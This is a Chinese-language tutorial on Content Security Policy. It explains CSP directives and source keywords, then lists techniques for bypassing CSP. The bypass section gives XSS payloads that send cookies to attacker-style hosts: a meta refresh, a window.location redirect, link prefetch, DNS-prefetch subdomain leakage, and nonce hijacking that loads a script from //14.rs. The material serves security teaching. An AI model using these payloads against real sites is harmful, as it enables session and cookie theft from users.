# CSP

内容安全策略或CSP是一种内置的浏览器安全措施，用于防御跨站点脚本（XSS）等Web攻击。该策略的规则用于定义一组浏览器可以安全地从中加载内容的路径和源，并给出相应的描述。其中，这些资源包括图像、frame、javascripts等。


一个CSP头由多组CSP策略组成，中间由分号分隔，就像这样：


```plain
Content-Security-Policy: default-src 'self' www.baidu.com; script-src 'unsafe-inline'

```



其中每一组策略包含一个策略指令和一个内容源列表


**一、常用的策略指令：**





### **default-src**





default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：





**child-src**child-src 指定定义了 web workers 以及嵌套的浏览上下文（如`<frame>`和`<iframe>`）的源。

* 
**connect-src**connect-src定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源。

* 
**font-src**font-src定义了字体加载的有效来源

* 
**img-src**img-src定义了页面中图片和图标的有效来源

* 
* **media-src**
* **object-src**

**script-src**script-src定义了页面中Javascript的有效来源

* 
**style-src**style-src定义了页面中CSS样式的有效来源

* 



## **二、内容源：**





内容源有三种：源列表、关键字和数据


**1、源列表**





```plain
源列表是一个字符串，指定了一个或多个互联网主机（通过主机名或 IP 地址），和可选的或端口号。站点地址可以包含可选的通配符前缀 (星号, '*')，端口号也可以使用通配符 (同样是 '*') 来表明所有合法端口都是有效来源。主机通过空格分隔。有效的主机表达式包括：    http://*.foo.com （匹配所有使用 http协议加载 foo.com 任何子域名的尝试。）    mail.foo.com:443 （匹配所有访问 mail.foo.com 的 443 端口 的尝试。）    https://store.foo.com  （匹配所有使用 https协议访问 store.foo.com 的尝试。）如果端口号没有被指定，浏览器会使用指定协议的默认端口号。如果协议没有被指定，浏览器会使用访问该文档时的协议。

```



**2、关键字**





‘none’  代表空集；即不匹配任何 URL。两侧单引号是必须的。

* 
‘self’  代表和文档同源，包括相同的 URL 协议和端口号。两侧单引号是必须的。

* 
‘unsafe-inline’  允许使用内联资源，如内联的

* 



### **3、数据**





data:  允许data: URI作为内容来源。

* 
* mediastream:  允许mediastream: URI作为内容来源。 Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream:



## CSP绕过

和XSS还是绑定在一起，毕竟需要绕过的就是XSS嘛


## 1**、url跳转**





在default-src ‘none’的情况下，可以使用meta标签实现跳转





```plain
<meta http-equiv="refresh" content="1;url=http://www.xss.com/x.php?c=[cookie]" >
1

```






在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。





```plain
<script>  window.location="http://www.xss.com/x.php?c=[cookie]";</script>
123

```



## 2、`<link>`标签预加载 CSP对link标签的预加载功能考虑不完善。





在Chrome下，可以使用如下标签发送cookie


```plain
<link rel="prefetch" href="http://www.xss.com/x.php?c=[cookie]">
1

```






在Firefox下，可以将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie





```plain
<link rel="dns-prefetch" href="//[cookie].xxx.ceye.io">
1

```






## **3、利用浏览器补全**


有些网站限制只有某些脚本才能使用，往往会使用`<script>`标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：


```plain
Content-Security-Policy: default-src 'none';script-src 'nonce-abc'
1

```






那么当脚本插入点为如下的情况时





```plain
<p>插入点</p>    <script id="aa" nonce="abc">document.write('CSP');</script>
12

```






这样会拼成一个新的script标签，其中的src可以自由设定





```plain
<p><script src=//14.rs a="</p>    <script id="aa" nonce="abc">document.write('CSP');</script>

```





